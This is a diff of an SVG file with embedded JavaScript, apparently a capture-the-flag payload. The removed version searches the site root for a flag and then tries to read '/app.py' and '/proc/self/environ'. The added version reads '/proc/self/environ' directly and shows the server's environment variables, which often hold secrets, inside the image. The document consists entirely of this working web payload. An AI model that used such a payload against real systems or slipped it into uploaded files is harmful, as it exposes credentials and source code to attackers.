@@ -1,45 +1,17 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-  <rect width="1000" height="1000" fill="white" />
-  <text id="flagText" x="10" y="50" font-size="20" fill="black">Loading...</text>
+  <rect width="1000" height="1000" fill="white"/>
+  <text id="envText" x="10" y="50" font-size="12" fill="black" style="font-family: monospace;">Loading environment...</text>
   <script type="text/javascript">
-    try {
-      const flagText = document.getElementById('flagText');
-
-      fetch('/')
-        .then(response => {
-          let headers = '';
-          for (let pair of response.headers.entries()) {
-            headers += `${pair[0]}: ${pair[1]}\n`;
-          }
-          flagText.textContent = `Headers:\n${headers}`;
-          return response.text();
-        })
-        .then(text => {
-          if (text.includes('flag{') || text.includes('FLAG{')) {
-            flagText.textContent = `Found flag in response:\n${text}`;
-          } else {
-            fetch('/app.py')
-              .then(r => r.text())
-              .then(code => {
-                flagText.textContent = `Server code:\n${code}`;
-              })
-              .catch(() => {
-                fetch('/proc/self/environ')
-                  .then(r => r.text())
-                  .then(env => {
-                    flagText.textContent = `Environment:\n${env}`;
-                  })
-                  .catch(() => {
-                    flagText.textContent = 'Could not find flag in common locations';
-                  });
-              });
-          }
-        })
-        .catch(error => {
-          flagText.textContent = `Error: ${error}`;
-        });
-    } catch (e) {
-      alert('Script error: ' + e);
-    }
+    fetch('/proc/self/environ')
+      .then(response => response.text())
+      .then(data => {
+        // Replace null bytes with newlines for display
+        const formattedData = data.replace(/\x00/g, '\n');
+        document.getElementById('envText').textContent = formattedData;
+      })
+      .catch(error => {
+        document.getElementById('envText').textContent = 'Error fetching environment: ' + error;
+      });
   </script>
-</svg>
+</svg> 
+
